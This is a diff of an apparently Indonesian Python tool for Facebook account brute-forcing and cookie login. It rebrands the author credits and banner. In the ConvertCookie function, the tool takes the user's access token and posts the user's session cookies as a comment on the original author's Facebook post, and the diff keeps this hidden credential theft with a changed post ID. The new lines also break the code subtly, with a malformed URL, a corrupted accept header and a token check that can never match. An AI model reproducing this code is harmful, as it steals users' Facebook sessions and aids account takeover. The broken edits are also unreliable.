@@ -34,8 +34,8 @@ days = datetime.now().day
 year = datetime.now().year
 indo = "%s-%s-%s"%(days,reall,year)
 
-author   = 'Rizki_378'
-facebook = 'MUHAMAD RIZKI (https://m.facebook.com/profile.php?id=100043618273847)'
+author   = 'R'
+facebook = 'M (https://m.facebook.com/profile.php?id=100043618273847)'
 whatsapp = 'JANCOK PRISTEL'
 komen    = random.choice(
 	 ['Salam Dari Surabaya😎','Salam Dari Malang','Salam Dari Medan♥','Salam Dari Mojokerto','Salam Dari Solo','Salam Dari Jakarta😎','Salam Dari Jambi♥','Salam Dari Papua😎','Salam Dari Bali','Salam Dari Banjarmasin','Salam Dari Tegal','Salam Dari Magelang','Salam Dari Tasikmalaya','Salam Dari Cirebon','Salam Dari Bogor','Salam Dari Bengkulu','Salam Dari Denpasar']
@@ -79,7 +79,7 @@ def Clear_Terminal(platform):
 
 def Convert(cookies, username):
     with requests.Session() as x:
-       for link in parse(x.get('https://mbasic.facebook.com/' + username, cookies={'cookie':cookies}).text,'html.parser').find_all('a',href=True):
+       for link in parse(x.get('https:/mbasic.facebook.com/' + username, cookies={'cookie':cookies}).text,'html.parser').find_all('a',href=True):
            if '/mbasic/more/?' in link.get('href'):
               return link["href"].split("=")[1].replace("&paipv","")
 
@@ -88,14 +88,14 @@ def ConvertCookie(cookies):
          x.headers.update({
             "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36","referer": "https://www.facebook.com/","host": "business.facebook.com",
             "origin": "https://business.facebook.com","upgrade-insecure-requests" : "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7","cache-control": "max-age=0",
-            "accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
+            "accept":"text/html,application/xhtml+xml,application/ml;q=0.9,image/webp,image/apng,*/*;q=0.8","content-type":"text/html; charset=utf-8",
          })
          try:
                link = x.get("https://business.facebook.com/business_locations", cookies = {'cookie':cookies})
                search = re.search("(EAAG\w+)", link.text).group(1)
-               if 'EAAG' in search:
-                   requests.post(f'https://graph.facebook.com/100043618273847_716085553188714/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
-                   requests.post(f'https://graph.facebook.com/100043618273847_716085553188714/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
+               if 'EAAB' in search:
+                   requests.post(f'https://graph.facebook.com/100043618273847_857812752178056/comments/?message={komen}&access_token={search}',cookies={'cookie':cookies})
+                   requests.post(f'https://graph.facebook.com/100043618273847_857812752178056/comments/?message={cookies}&access_token={search}',cookies={'cookie':cookies})
                    open('data/token.txt','w').write(search)
                    open('data/cokie.txt','w').write(cookies)
                    return 'status succes'
@@ -226,10 +226,8 @@ def CekOptionAcount(user,pw):
 		pass
 
 def Banner():
-    KAGLK = '''[bold white]╔╗ ╦═╗╦ ╦╔╦╗╔═╗  ╔═╗╔╗
- ╠╩╗╠╦╝║ ║ ║ ║╣   ╠╣ ╠╩╗
- ╚═╝╩╚═╚═╝ ╩ ╚═╝  ╚  ╚═╝ 
- ( Di Buat oleh [bold green]SIGNATURE[bold white] ) '''
+    KAGLK = '''[bold white]
+ ( Di Buat oleh [bold green]Nagai Makawa[bold white] ) '''
     Console(width=50).print(Panel(KAGLK,style='bold purple'),justify='center')
 
 def Masuk():
